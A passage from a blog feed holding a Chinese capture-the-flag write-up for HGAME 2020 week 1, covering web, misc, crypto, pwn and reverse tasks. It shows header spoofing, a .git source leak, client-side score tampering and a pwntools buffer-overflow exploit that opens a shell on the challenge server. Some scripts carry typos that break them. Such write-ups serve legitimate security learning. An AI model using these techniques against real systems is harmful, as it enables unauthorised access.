href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie" target="_blank" rel="noopener">Document.cookie</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> vidar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2020week1_wp</title>
      <link href="/2020/01/25/hgame2020week1-wp/"/>
      <url>/2020/01/25/hgame2020week1-wp/</url>
      
        <content type="html"><![CDATA[<p>感谢出题人的耐心解答…<br>= =可惜大二了才刚刚开始….<br>py出题人虽然可耻但有用(X</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Cosmos的博客"><a href="#Cosmos的博客" class="headerlink" title="Cosmos的博客"></a>Cosmos的博客</h3><p><img src="01.png" alt=""><br>.git源码泄露<br>payload：<a href="http://cosmos.hgame.n3ko.co/.git/config" target="_blank" rel="noopener">http://cosmos.hgame.n3ko.co/.git/config</a><br><img src="03.png" alt=""><br>把github上的仓库git clone下来再进行回滚<br>git clone <a href="https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc" target="_blank" rel="noopener">https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc</a><br>cd 8LTUKCL83VLhXbc<br>git log<br><img src="04.png" alt=""><br>commit 后面就是对应的版本id<br><img src="05.png" alt=""><br>Base64解码之后就可以得到flag</p><h3 id="接头霸王"><a href="#接头霸王" class="headerlink" title="接头霸王"></a>接头霸王</h3><p>看见题目就想到请求头，用postman一步步进行修改<br><img src="06.png" alt=""><br>根据提示在请求头中一步步添加<br>referer:<a href="https://vidar.club/" target="_blank" rel="noopener">https://vidar.club/</a><br>X-Forwarded-For:127.0.0.1(You need to visit locally)<br>User-Agent：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Cosmos/78.0.3904.108 Safari/537.36(use Cosmos Brower)<br>之后提示<br><img src="11.png" alt=""><br>看一下响应头<br><img src="12.png" alt=""><br><img src="08.png" alt=""><br>因为请求方式是POST，所以 if-Unmodified-Since:Tue,15 Nov 2099 00:00:00 GMT  </p><h3 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h3><p>f12看源码<br><img src="14.png" alt=""><br>发现提示，用burpsuite抓包<br><img src="15.png" alt=""><br><img src="45.png" alt=""><br>405是指method not allowed，所以把get改成post<br><img src="17.png" alt=""><br>因为+会被当作空格处理，所以用url的%2b<br><img src="18.png" alt=""></p><h3 id="鸡尼泰玫"><a href="#鸡尼泰玫" class="headerlink" title="鸡尼泰玫"></a>鸡尼泰玫</h3><p>发现是个小游戏，先玩一下，输掉之后发现有提示：积分达到30000才能拿到flag<br>F12看一下源码<br><img src="13.png" alt=""><br>在console中直接输入storageScore=30000;globalScore=30000，覆盖原值<br>再开始玩游戏，直接输掉之后积分超过30000了，就可以看到flag</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h3><p>看这个字符串以为是什么特殊的编码，google搜不到就百度一下<br>用base64解码，解出来是morse码，再在线解一下就可以得到flag  </p><h3 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h3><p>winhex打开后发现含有flag.txt文件并且尾部有提示：passsword is picture ID<br>后来才知道这个id指的是p站上的图片id…<br>图片里有个压缩包(PK开头)<br>foremost 图片名.jpg<br>分离得到一个加密压缩包，输入图片id<br>txt里是unicode码，在线解码下得到flag   </p><h3 id="克苏鲁神话"><a href="#克苏鲁神话" class="headerlink" title="克苏鲁神话"></a>克苏鲁神话</h3><p>打开bacon.txt，看名字是培根加密<br><img src="22.png" alt=""><br>根据这个解密，得到flaghiddenindoc这个提示，但是这个不是密码<br>后来搜索到明文攻击，用zip不行所以用7z<br>解压后得到一个doc文件，选择隐藏文字功能flag就可以显示了    </p><h3 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h3><p>根据提示进行栅栏解密，凯撒解密，密码为大写<br><img src="23.png" alt=""><br>解压之后得到OK.txt，在线okk解码，发现base32的提示，base32解码后再base64，再转换为文本，发现开头是png，于是转成16进制，复制进winhex保存为png可得二维码，扫一下就有flag了  </p><h3 id="每日推荐"><a href="#每日推荐" class="headerlink" title="每日推荐"></a>每日推荐</h3><p>（感谢出题人的耐心解答qwq）<br>（一开始直接用foremost分离文件，再winrar修复文件是不行的…）<br>通过foremost可以看到里边有zip文件<br>在wireshark里打开后，搜索zip，找到了对应的包<br><img src="26.png" alt=""><br>导出后发现有提示密码为六位数字，用AAPR爆破得到密码<br>解压后得到一个mp3文件，用audacity打开，目测一下波形没什么奇怪的地方（还挺好听<br>再看看频谱图得到flag  </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="infantRSA"><a href="#infantRSA" class="headerlink" title="infantRSA"></a>infantRSA</h3><p>给出数据如下<br>p = 681782737450022065655472455411;<br>q = 675274897132088253519831953441;<br>e = 13;<br>c=pow(m,e,p * q)=275698465082361070145173688411496311542172902608559859019841<br><img src="24.png" alt=""><br>所以已知pqec的话先求出d，再求m就好<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p=<span class="number">681782737450022065655472455411</span></span><br><span class="line">q=<span class="number">675274897132088253519831953441</span></span><br><span class="line">e=<span class="number">13</span></span><br><span class="line">c=<span class="number">275698465082361070145173688411496311542172902608559859019841</span></span><br><span class="line">s=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d=long(gmmpy2.invert(e,s))</span><br><span class="line">n=p*q</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">res=m.to_bytes(m.bit_length(),byteorder=<span class="string">'big'</span>)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure></p><h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><p>这题直接改了网上的脚本<br>a.b.flag都是未知的，但是我们知道密文和明文中的hgame，于是先求a和b<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number inverse</span><br><span class="line"></span><br><span class="line">TABLE = <span class="string">'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'</span></span><br><span class="line">MOD = len(TABLE)</span><br><span class="line"></span><br><span class="line">pre=[<span class="number">12</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">18</span>]</span><br><span class="line">post=[<span class="number">46</span>,<span class="number">33</span>,<span class="number">43</span>,<span class="number">30</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(MOD):</span><br><span class="line"><span class="keyword">if</span> GCD(a,MOD)!=<span class="number">1</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">inv_a=inverse(a,MOD)</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> range(MOD):</span><br><span class="line">q=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line"><span class="keyword">if</span>(inv_a*(post[i]-b))%MOD!=pre[i]:</span><br><span class="line">q=<span class="number">0</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span>(q):</span><br><span class="line">print(a,b)</span><br><span class="line"><span class="comment">#13,14</span></span><br></pre></td></tr></table></figure></p><p>ab求出后可以求得完整的明文<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number inverse</span><br><span class="line"></span><br><span class="line">TABLE = <span class="string">'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'</span></span><br><span class="line">MOD = len(TABLE)</span><br><span class="line">a=<span class="number">13</span></span><br><span class="line">b=<span class="number">14</span></span><br><span class="line">inv_a=inverse(a,MOD)</span><br><span class="line">cipher=<span class="string">'A8I5z&#123;xr1A_J7ha_vG_TpH410&#125;'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> cipher:</span><br><span class="line">i=TABLE.find(p)</span><br><span class="line"><span class="keyword">if</span> i==<span class="number">-1</span>:</span><br><span class="line">flag+=p</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ii=(inv_a*(i-b))%MOD</span><br><span class="line">flag+=TABLE[ii]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p><h3 id="Reorder"><a href="#Reorder" class="headerlink" title="Reorder"></a>Reorder</h3><p>这题一开始是真的懵比…..后来问了一下lurk<br>发现输入某个字符后，返回后的字符所在位置就是所对应的密文<br><img src="00.png" alt=""><br>输入<br>0<br>00<br>000<br>0000<br>00000<br>发现返回的位置和hgame相对应，之后一直添加输入数量，再观察每次新增的位置所对应的字符就好啦~  </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h3><p>感谢C老板的耐心解答，顺便把坑都踩了一遍….<br>下载之后先例常checksec（感觉保护开没开其实影响不是很大…..也可能是因为我不懂）<br>Ida启动！f5！<br><img src="31.png" alt=""><br><img src="32.png" alt=""><br>可以通过gets()使得s溢出覆盖v5的值，从而满足if内的条件，执行backdoor()函数<br>s与v5的相对距离为0xAC-0x31,这一段用随便什么数据填充:’a’ <em> (0xAC-0x31)<br>之后要满足memcmp的条件即memcmp(“0O0o”,&amp;v5,7u)==0<br>在7个内存单元内，v5能和“0O0o”相等（….没注意到7…）<br>双击memcmp中的“0O0o”，跳转<br><img src="33.png" alt=""><br>发现和”O0”相邻，就是说比较完“0O0o”后会继续比较“O0”<br>所以构造payload=’a’ </em> (0xAC-0x31)+’ 0O0o\00O0’(之前还打成了’0O0o\\00O0’,我是真的蠢)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"47.103.214.163"</span>,<span class="string">"20000"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Let's 0O0o\\0O0!"</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*(<span class="number">0xAC</span><span class="number">-0x31</span>)+<span class="string">'0O0o\00O0'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>连上后输入ls查看目录，发现有个flag，再cat flag读取内容就好了  </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h3><p>Ida启动！f5！<br><img src="39.png" alt=""><br>猜测是方向键，选中数字按R后就会变成dswa(常用方向键)<br><img src="40.png" alt=""><br><img src="41.png" alt=""><br>代码给出了迷宫范围(上下限)以及v5要走的路线(0上)<br>先看看v5的行走范围，即迷宫地图，点进unk_602080 </p><p><img src="42.png" alt="">  </p><p>长这样，选中unk_602080和unk_    60247C间的内容按a可以简单合并一下，标记好出口和入口位置<br>通过代码分析，上下移动对应64个step，左右对应4个，所以删除掉多余的数据（我是手动删….）<br><img src="44.png" alt=""><br>其中上边的(0是入口，最后的(0是出口，可以很明显看到走出迷宫的路径<br>行走的方向键加上hgame{}就是flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> vidar </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
